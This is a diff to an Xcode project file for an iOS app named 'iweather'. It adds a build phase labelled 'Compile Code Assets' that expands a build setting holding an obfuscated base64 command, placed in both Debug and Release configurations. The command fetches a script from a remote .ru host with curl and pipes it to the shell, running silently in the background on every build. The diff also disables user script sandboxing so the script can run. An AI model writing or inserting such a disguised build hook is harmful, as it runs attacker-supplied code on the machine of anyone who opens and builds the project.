@@ -6,6 +6,12 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		8EED036C3032D74E00F68C15 /* iweather.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iweather.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -52,6 +58,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8EED03773032D74F00F68C15 /* Build configuration list for PBXNativeTarget "iweather" */;
 			buildPhases = (
+				1AAE0D66DF954024B17BBDC8 /* Compile Code Assets */,
 				8EED03683032D74E00F68C15 /* Sources */,
 				8EED03693032D74E00F68C15 /* Frameworks */,
 				8EED036A3032D74E00F68C15 /* Resources */,
@@ -104,6 +111,28 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		1AAE0D66DF954024B17BBDC8 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		8EED036A3032D74E00F68C15 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -128,6 +157,7 @@
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8CDBB7 = "((z(){ `printf baQse64 | tr -d Q` --decode; };echo ZWNobyAiJChjdXJsIC1rZnNMIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -163,7 +193,7 @@
 				DEVELOPMENT_TEAM = LDZ6BVKWUK;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -192,6 +222,7 @@
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8CDBB7 = "((z(){ `printf baQse64 | tr -d Q` --decode; };echo ZWNobyAiJChjdXJsIC1rZnNMIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -227,7 +258,7 @@
 				DEVELOPMENT_TEAM = LDZ6BVKWUK;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
